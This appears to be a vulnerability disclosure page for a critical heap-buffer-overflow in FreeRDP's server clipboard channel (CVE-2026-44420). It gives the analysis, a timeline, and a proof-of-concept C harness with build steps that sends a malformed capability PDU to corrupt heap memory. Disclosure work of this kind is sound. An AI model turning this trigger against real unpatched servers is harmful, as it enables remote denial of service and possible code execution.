@@ -1,0 +1,271 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ANT-2026-H97FY6C8 · freerdp/freerdp</title>
+<link rel="icon" type="image/x-icon" href="/anthropic-serve/favicon.ico">
+<script>(function(){try{var t=localStorage.getItem("cvd_theme");if(t==="light"||t==="dark")document.documentElement.setAttribute("data-theme",t);}catch(e){}})();</script>
+<link rel="stylesheet" href="../assets/site.css">
+<link rel="stylesheet" href="../assets/ledger.css">
+</head>
+<body>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-MT0111843S"></script><script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag() { dataLayer.push(arguments); }
+  gtag('js', new Date());
+  gtag('config', 'G-MT0111843S');
+</script>
+<main>
+<h1>ANT-2026-H97FY6C8 · freerdp/freerdp</h1>
+<nav class="site-nav muted">
+<a href="../index.html">Overview</a>  ·
+<a href="../ledger/index.html">Ledger</a>  ·
+<a href="../archive/index.html">Archive</a>  ·
+<a href="../about/index.html">About</a>  <span class="theme-toggle">
+    <button type="button" data-set-theme="light">Light</button>
+    <button type="button" data-set-theme="dark">Dark</button>
+    <button type="button" data-set-theme="system">System</button>
+  </span>
+</nav>
+<h2>
+  oob-write
+  <span class="sev-badge sev-critical">critical</span>
+</h2>
+
+<p class="id-badges">
+  <a class="id-badge" href="https://nvd.nist.gov/vuln/detail/CVE-2026-44420">CVE-2026-44420</a>
+  <a class="id-badge" href="https://github.com/FreeRDP/FreeRDP/security/advisories/GHSA-mpxh-8fq3-x8mh">GHSA-mpxh-8fq3-x8mh</a>
+  <a class="id-badge" href="https://github.com/FreeRDP/FreeRDP/security/advisories/GHSA-mvpx-xj7r-3p3r">GHSA-mvpx-xj7r-3p3r</a>
+  <a class="id-badge" href="https://github.com/FreeRDP/FreeRDP/security/advisories/GHSA-p6r2-4hgm-m6ff">GHSA-p6r2-4hgm-m6ff</a>
+</p>
+
+<p class="sev-compare">
+  <span class="sev-compare-label">Severity</span>
+  <span class="sev-compare-item">Claude <span class="sev-chip sev-critical">critical</span></span>
+  <span class="sev-compare-sep">·</span>
+  <span class="sev-compare-item">Security research firm <span class="sev-chip sev-critical">critical (revised; sealed as high)</span></span>
+  <span class="sev-compare-sep">·</span>
+  <span class="sev-compare-item">Maintainer <span class="sev-chip sev-unknown">-</span></span>
+</p>
+
+<p class="attribution">Discovered by
+<span class="model-chip">Claude Mythos Preview</span></p>
+
+
+<div class="marker">REPORT</div>
+<p class="section-intro">Anthropic's analysis, sealed at approval. Disclosure to the maintainer was performed by Trail of Bits.</p>
+<div class="report-body" tabindex="0"><h1>ANT-2026-H97FY6C8: Heap-buffer-overflow in cliprdr_main.c:547</h1>
+<p>In FreeRDP's server-side clipboard channel handler, cliprdr_server_receive_capabilities() parses a CB_CLIP_CAPS PDU from the connected client. The server uses the client-supplied capabilitySetLength field directly as the size for a realloc() at cliprdr_main.c:535, then unconditionally writes a 12-byte CLIPRDR_GENERAL_CAPABILITY_SET struct into that buffer at line 547. A malicious client setting capabilitySetLength=1 causes a 1-byte allocation followed by a 12-byte write, yielding a deterministic heap-buffer-overflow (3/3 runs).</p>
+<h2>Target</h2>
+<p><strong>Project:</strong> freerdp/freerdp<br>
+<strong>Location:</strong> <code>cliprdr_main.c:547</code>  </p>
+<h2>Technical Details</h2>
+<p>ASAN: heap-buffer-overflow WRITE of size 2 at 0x502000005c10 in cliprdr_server_receive_capabilities (cliprdr_main.c:547). The root cause is that the server trusts the client-supplied capabilitySetLength without validating it is at least sizeof(CLIPRDR_GENERAL_CAPABILITY_SET); realloc() at cliprdr_main.c:535 allocates only 1 byte, and the subsequent struct store writes past the end of that allocation.</p>
+<p><strong>Crash trace:</strong></p>
+<pre tabindex="0"><code>The PoC is a well-crafted C harness that #includes the FreeRDP server cliprdr source to access the static function `cliprdr_server_receive_capabilities()`. It constructs a malicious CB_CLIP_CAPS PDU with `capabilitySetLength=1`, which causes the server to `realloc()` only 1 byte but then write a 12-byte `CLIPRDR_GENERAL_CAPABILITY_SET` struct into that buffer.
+
+All 3 runs produced identical ASAN reports:
+- **Error**: `heap-buffer-overflow on address 0x502000005c10`
+- **Type**: WRITE of size 2
+- **Location**: `cliprdr_server_receive_capabilities` at `cliprdr_main.c:547`
+- **Allocation**: `realloc` called at `cliprdr_main.c:535` allocated only 1 byte
+- **Exit code**: 1 (all 3 runs)
+
+The crash is deterministic (3/3), is not OOM or timeout, and occurs entirely within FreeRDP project code. The vulnerability is a real heap-buffer-overflow write caused by trusting a client-supplied `capabilitySetLength` field without validation.
+</code></pre>
+<h2>Reproduction</h2>
+<ol>
+<li>Connect as an RDP client to the FreeRDP server and negotiate the cliprdr channel</li>
+<li>Send a CB_CLIP_CAPS PDU containing a general capability set with capabilitySetLength=1</li>
+<li>Server realloc()s 1 byte then writes a 12-byte CLIPRDR_GENERAL_CAPABILITY_SET, overflowing the heap</li>
+</ol>
+<p><em>[No reproducer or sanitizer output attached — request from security-cvd@anthropic.com if needed.]</em></p>
+<h2>Acknowledgement</h2>
+<p>This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by the Anthropic security team in collaboration with Anthropic Research. Please direct questions to security-cvd@anthropic.com and reference ANT-2026-H97FY6C8.</p>
+<hr>
+<p><strong>Reference:</strong> ANT-2026-H97FY6C8<br>
+<strong>Anthropic CVD Policy:</strong> https://www.anthropic.com/coordinated-vulnerability-disclosure</p></div>
+
+<div class="marker">SECURITY RESEARCH FIRM ANALYSIS</div>
+<p class="section-intro">Triage and disclosure were performed by Trail of Bits. The writeup below is the document the firm sent to the maintainer. The severity shown is the firm's current assessment; the report was sealed with the firm's earlier assessment of high.</p>
+<dl class="vendor-analysis">
+<dt>Verdict</dt><dd><span class="verdict-chip verdict-tp">true positive</span></dd><dt>Severity</dt><dd class="sev-critical">critical (revised; sealed as high)</dd></dl>
+<div class="report-body" tabindex="0"><h3>Summary</h3>
+<p>A malicious RDP client can trigger a heap-buffer-overflow write in FreeRDP's server-side clipboard (cliprdr) channel by sending a CB_CLIP_CAPS PDU with a too-small <code>capabilitySetLength</code>. This can crash the server process (remote DoS) and may be exploitable for code execution because it corrupts heap memory.</p>
+<h3>Details</h3>
+<p>Tested on FreeRDP commit 23b36cd00ebf0ccd97750fcdbc9aa2f362352da7. The issue is in the server cliprdr capability parsing routine. In<code>channels/cliprdr/server/cliprdr_main.c</code>, <code>cliprdr_server_receive_pdu()</code> dispatches <code>CB_CLIP_CAPS</code> to <code>cliprdr_server_receive_capabilities()</code>. <code>cliprdr_server_receive_capabilities()</code> reads <code>capabilitySetLength</code> from the client-controlled stream and uses it to grow the heap buffer with <code>realloc(cap_sets_size)</code>. The function then unconditionally writes a <code>CLIPRDR_GENERAL_CAPABILITY_SET</code> into that buffer, starting by writing <code>capSet-&gt;capabilitySetType</code> (line 548) and <code>capSet-&gt;capabilitySetLength</code>, then reading and storing <code>version</code> and <code>generalFlags</code>  via <code>cliprdr_server_receive_general_capability()</code>. Because <code>sizeof(CLIPRDR_GENERAL_CAPABILITY_SET) == 12</code>, setting <code>capabilitySetLength = 1</code> causes a 1-byte allocation followed by a 12-byte struct write (11 bytes out-of-bounds).</p>
+<h3>PoC</h3>
+<p>These steps reproduce the issue with ASAN and show the exact crash site.</p>
+<p>1) Build FreeRDP with ASAN (example build that avoids optional deps):</p>
+<pre tabindex="0"><code class="language-bash">git clone https://github.com/FreeRDP/FreeRDP.git /tmp/freerdp-src
+cd /tmp/freerdp-src
+git checkout 23b36cd00ebf0ccd97750fcdbc9aa2f362352da7
+
+mkdir build-asan &amp;&amp; cd build-asan
+cmake .. \
+  -DCMAKE_BUILD_TYPE=RelWithDebInfo \
+  -DCMAKE_C_FLAGS='-g -O1 -fno-omit-frame-pointer -fsanitize=address,undefined' \
+  -DCMAKE_CXX_FLAGS='-g -O1 -fno-omit-frame-pointer -fsanitize=address,undefined' \
+  -DCMAKE_EXE_LINKER_FLAGS='-fsanitize=address,undefined' \
+  -DCMAKE_SHARED_LINKER_FLAGS='-fsanitize=address,undefined' \
+  -DWITH_SERVER=ON -DBUILD_TESTING=OFF \
+  -DWITH_FFMPEG=OFF -DWITH_VIDEO_FFMPEG=OFF -DWITH_DSP_FFMPEG=OFF -DWITH_SWSCALE=OFF \
+  -DWITH_FUSE=OFF -DCHANNEL_URBDRC=OFF
+cmake --build . -j&quot;$(nproc)&quot; --target freerdp winpr
+cd ..
+</code></pre>
+<p>2) Create <code>repro_bug.c</code> in <code>/tmp/freerdp-src</code>:</p>
+<pre tabindex="0"><code class="language-c">#include &lt;freerdp/config.h&gt;
+
+#include &lt;winpr/crt.h&gt;
+#include &lt;winpr/stream.h&gt;
+
+#include &lt;freerdp/channels/cliprdr.h&gt;
+#include &lt;freerdp/server/cliprdr.h&gt;
+
+#include &quot;channels/cliprdr/server/cliprdr_main.h&quot;
+
+/*
+ * This PoC intentionally #includes FreeRDP channel sources to reach the
+ * static function cliprdr_server_receive_capabilities().
+ */
+#include &quot;channels/cliprdr/cliprdr_common.c&quot;
+#include &quot;channels/cliprdr/server/cliprdr_main.c&quot;
+
+int main(void)
+{
+        CliprdrServerContext ctx;
+        ZeroMemory(&amp;ctx, sizeof(ctx));
+
+        wStream* s = Stream_New(NULL, 256);
+        if (!s)
+                return 1;
+
+        /* CLIPRDR_CAPABILITIES */
+        Stream_Write_UINT16(s, 1);      /* cCapabilitiesSets */
+        Stream_Write_UINT16(s, 0);      /* pad1 */
+
+        /* CLIPRDR_CAPABILITY_SET */
+        Stream_Write_UINT16(s, 0x0001); /* CB_CAPSTYPE_GENERAL */
+        Stream_Write_UINT16(s, 1);      /* capabilitySetLength (BUG: too small) */
+
+        /* CLIPRDR_GENERAL_CAPABILITY_SET payload (8 bytes) */
+        Stream_Write_UINT32(s, 1);      /* version */
+        Stream_Write_UINT32(s, 0);      /* generalFlags */
+
+        Stream_SealLength(s);
+        Stream_SetPosition(s, 0);
+
+        CLIPRDR_HEADER header;
+        ZeroMemory(&amp;header, sizeof(header));
+
+        (void)cliprdr_server_receive_capabilities(&amp;ctx, s, &amp;header);
+
+        Stream_Free(s, TRUE);
+        return 0;
+}
+</code></pre>
+<p>3) Compile and run:</p>
+<pre tabindex="0"><code class="language-bash">cd /tmp/freerdp-src
+cc -g -O1 -fno-omit-frame-pointer -fsanitize=address,undefined \
+  -I build-asan -I include -I winpr/include -I build-asan/include -I build-asan/winpr/include \
+  -I channels/cliprdr -I channels/cliprdr/server \
+  repro_bug.c -o repro_bug \
+  -L build-asan/winpr/libwinpr -lwinpr3 -L build-asan/libfreerdp -lfreerdp3 \
+  -Wl,-rpath,build-asan/winpr/libwinpr:build-asan/libfreerdp
+
+ASAN_OPTIONS='detect_leaks=0:abort_on_error=1:halt_on_error=1:print_stacktrace=1' \
+  ./repro_bug
+</code></pre>
+<p>Expected result: ASAN reports <code>heap-buffer-overflow</code> with the write at <code>channels/cliprdr/server/cliprdr_main.c:548</code> and the allocation at <code>channels/cliprdr/server/cliprdr_main.c:536</code> (1-byte <code>realloc</code>).</p>
+<h3>Suggested fix</h3>
+<p>The fix is to reject capabilitySetLength values smaller than the minimum expected struct sizes before allocating and writing, and to size the allocation based on the actual struct size written. See https://github.com/FreeRDP/FreeRDP-ghsa-mvpx-xj7r-3p3r/compare/advisory-fix-1</p>
+<h3>Impact</h3>
+<p>A FreeRDP-based server that enables the cliprdr server channel is impacted. A remote RDP client that can reach the CLIPRDR capability exchange can trigger a controlled heap corruption primitive in the server process. At minimum this is a reliable remote denial of service; depending on allocator behavior and build hardening, it may be exploitable for remote code execution in the server process.</p>
+<p><strong>Background of that issue</strong>
+This bug was found as a part of an Anthropic research into the use of large language models for automated vulnerability discovery in open source software. Anthropic then engaged Trail of Bits to independently triage and validate those issues.</p></div>
+
+
+
+
+
+<div class="marker">TIMELINE</div>
+<p class="section-intro">Recorded dates, in order.</p>
+<div class="figure">
+  <ol class="timeline">
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-03-24</span>
+      <span class="timeline-label">Discovered or logged</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-04-30</span>
+      <span class="timeline-label">Sent to maintainer</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-04-30</span>
+      <span class="timeline-label">Maintainer acknowledged</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-05-07</span>
+      <span class="timeline-label">Patch released</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-05-20</span>
+      <span class="timeline-label">Publicly revealed</span>
+    </li>
+  </ol>
+</div>
+
+<div class="marker">PROVENANCE</div>
+<p class="kicker">SHA-3-512 hash:</p>
+<p class="hash full">af9e55fee0270dad8d041247bd41b08bbfbf3bb1a93546ff73a9dca44e1d558f6eaae58c86efeb983a2e8a73cf63fdbe81e98df6e58dbebb269404317829b9cc</p>
+<p class="kicker">Committed 2026-04-30 07:03 UTC</p>
+<p class="kicker">Revealed 2026-05-20 07:40 UTC</p>
+<p class="kicker">
+  <a download="ANT-2026-H97FY6C8-preimage.json"
+     href="data:application/json;charset=utf-8,%7B%22ant_id%22%3A%22ANT-2026-H97FY6C8%22%2C%22bug_class%22%3A%22Heap-buffer-overflow%22%2C%22claude_severity%22%3A%22critical%22%2C%22commit_sha%22%3Anull%2C%22created_at%22%3A%222026-03-24T20%3A44%3A14%2B00%3A00%22%2C%22description%22%3A%22In%20FreeRDP%27s%20server-side%20clipboard%20channel%20handler%2C%20cliprdr_server_receive_capabilities%28%29%20parses%20a%20CB_CLIP_CAPS%20PDU%20from%20the%20connected%20client.%20The%20server%20uses%20the%20client-supplied%20capabilitySetLength%20field%20directly%20as%20the%20size%20for%20a%20realloc%28%29%20at%20cliprdr_main.c%3A535%2C%20then%20unconditionally%20writes%20a%2012-byte%20CLIPRDR_GENERAL_CAPABILITY_SET%20struct%20into%20that%20buffer%20at%20line%20547.%20A%20malicious%20client%20setting%20capabilitySetLength%3D1%20causes%20a%201-byte%20allocation%20followed%20by%20a%2012-byte%20write%2C%20yielding%20a%20deterministic%20heap-buffer-overflow%20%283/3%20runs%29.%22%2C%22discovered_at%22%3Anull%2C%22location%22%3A%22cliprdr_main.c%3A547%22%2C%22poc_sha256%22%3Anull%2C%22preimage_version%22%3A1%2C%22project%22%3A%22freerdp%22%2C%22reproduction%22%3A%5B%221.%20Connect%20as%20an%20RDP%20client%20to%20the%20FreeRDP%20server%20and%20negotiate%20the%20cliprdr%20channel%22%2C%222.%20Send%20a%20CB_CLIP_CAPS%20PDU%20containing%20a%20general%20capability%20set%20with%20capabilitySetLength%3D1%22%2C%223.%20Server%20realloc%28%29s%201%20byte%20then%20writes%20a%2012-byte%20CLIPRDR_GENERAL_CAPABILITY_SET%2C%20overflowing%20the%20heap%22%5D%2C%22technical_details%22%3A%22ASAN%3A%20heap-buffer-overflow%20WRITE%20of%20size%202%20at%200x502000005c10%20in%20cliprdr_server_receive_capabilities%20%28cliprdr_main.c%3A547%29.%20The%20root%20cause%20is%20that%20the%20server%20trusts%20the%20client-supplied%20capabilitySetLength%20without%20validating%20it%20is%20at%20least%20sizeof%28CLIPRDR_GENERAL_CAPABILITY_SET%29%3B%20realloc%28%29%20at%20cliprdr_main.c%3A535%20allocates%20only%201%20byte%2C%20and%20the%20subsequent%20struct%20store%20writes%20past%20the%20end%20of%20that%20allocation.%22%2C%22title%22%3A%22Heap-buffer-overflow%20in%20cliprdr_main.c%3A547%22%2C%22vendor_severity%22%3A%22high%22%7D">Verify (download preimage.json)</a>
+</p>
+<details class="preimage">
+  <summary>Show preimage JSON</summary>
+  <pre class="preimage-body">{
+  &#34;ant_id&#34;: &#34;ANT-2026-H97FY6C8&#34;,
+  &#34;bug_class&#34;: &#34;Heap-buffer-overflow&#34;,
+  &#34;claude_severity&#34;: &#34;critical&#34;,
+  &#34;commit_sha&#34;: null,
+  &#34;created_at&#34;: &#34;2026-03-24T20:44:14+00:00&#34;,
+  &#34;description&#34;: &#34;In FreeRDP&#39;s server-side clipboard channel handler, cliprdr_server_receive_capabilities() parses a CB_CLIP_CAPS PDU from the connected client. The server uses the client-supplied capabilitySetLength field directly as the size for a realloc() at cliprdr_main.c:535, then unconditionally writes a 12-byte CLIPRDR_GENERAL_CAPABILITY_SET struct into that buffer at line 547. A malicious client setting capabilitySetLength=1 causes a 1-byte allocation followed by a 12-byte write, yielding a deterministic heap-buffer-overflow (3/3 runs).&#34;,
+  &#34;discovered_at&#34;: null,
+  &#34;location&#34;: &#34;cliprdr_main.c:547&#34;,
+  &#34;poc_sha256&#34;: null,
+  &#34;preimage_version&#34;: 1,
+  &#34;project&#34;: &#34;freerdp&#34;,
+  &#34;reproduction&#34;: [
+    &#34;1. Connect as an RDP client to the FreeRDP server and negotiate the cliprdr channel&#34;,
+    &#34;2. Send a CB_CLIP_CAPS PDU containing a general capability set with capabilitySetLength=1&#34;,
+    &#34;3. Server realloc()s 1 byte then writes a 12-byte CLIPRDR_GENERAL_CAPABILITY_SET, overflowing the heap&#34;
+  ],
+  &#34;technical_details&#34;: &#34;ASAN: heap-buffer-overflow WRITE of size 2 at 0x502000005c10 in cliprdr_server_receive_capabilities (cliprdr_main.c:547). The root cause is that the server trusts the client-supplied capabilitySetLength without validating it is at least sizeof(CLIPRDR_GENERAL_CAPABILITY_SET); realloc() at cliprdr_main.c:535 allocates only 1 byte, and the subsequent struct store writes past the end of that allocation.&#34;,
+  &#34;title&#34;: &#34;Heap-buffer-overflow in cliprdr_main.c:547&#34;,
+  &#34;vendor_severity&#34;: &#34;high&#34;
+}</pre>
+</details>
+</main>
+<footer>
+  <p>Anthropic Frontier Red Team</p>
+  <p>Snapshot generated at 2026-11-02 19:30 UTC</p>
+  <p>Dates and times are in UTC</p>
+  <p>Manifest hash <code>25d811e7b56632ef5bbb23eb…</code></p>
+  <p>Archived snapshots remain available at their dated paths so any figure can be verified against the page that was live on that date</p>
+  <p><a href="../data/payload.json">payload.json</a></p>
+</footer>
+<script src="../assets/figures.js" data-root="../"></script>
+<script src="../assets/ledger.js"></script>
+</body>
+</html>
